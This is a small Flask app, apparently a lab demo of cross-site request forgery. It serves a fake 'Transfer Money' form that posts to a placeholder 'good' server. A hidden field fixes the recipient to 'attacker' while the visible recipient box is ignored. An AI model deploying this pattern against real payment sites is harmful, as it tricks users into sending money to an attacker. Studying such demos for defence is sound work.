from flask import Flask, render_template, request, make_response, redirect

app = Flask(__name__)

html = """
<html><body>
<h1>Transfer Money<img src=https://www.flaticon.com/svg/static/icons/svg/3716/3716811.svg>
<form method='post' action='http://good:5000/transfer' ><p>
Amount:<input name='amount'><p>
To:<input name='faketo' id='to'>
<input type='hidden' name='to' value='attacker'>
<input type=submit value='transfer'>
</form>
</body></html>
"""
@app.route('/')
def r():
    response=make_response(redirect("/transfer"))
    return response

@app.route('/transfer', methods=['GET'])
def csrf():
    return html
